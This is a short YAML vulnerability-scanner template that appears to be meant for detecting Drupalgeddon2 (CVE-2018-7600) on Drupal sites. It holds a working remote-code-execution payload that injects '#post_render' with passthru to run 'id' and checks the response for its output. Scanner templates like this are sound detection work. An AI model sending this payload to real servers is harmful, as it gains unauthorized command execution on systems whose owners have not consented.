id: drupalgeddon2
name: Drupalgeddon2 RCE
severity: critical
cve: CVE-2018-7600
tags: [drupal, cms, rce, php]
port: 80
protocol: http
intrusive: true
description: Drupal < 7.58 / 8.x < 8.3.9 unauthenticated remote code execution
remediation: Update Drupal to patched version immediately
reference: https://nvd.nist.gov/vuln/detail/CVE-2018-7600
steps:
  - type: send
    data: /
  - type: match
    regex: "(drupal|sites/default|misc/drupal)"
    part: body
  - type: send
    data: /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id
  - type: match
    regex: "(uid=|www-data|apache)"
    part: body
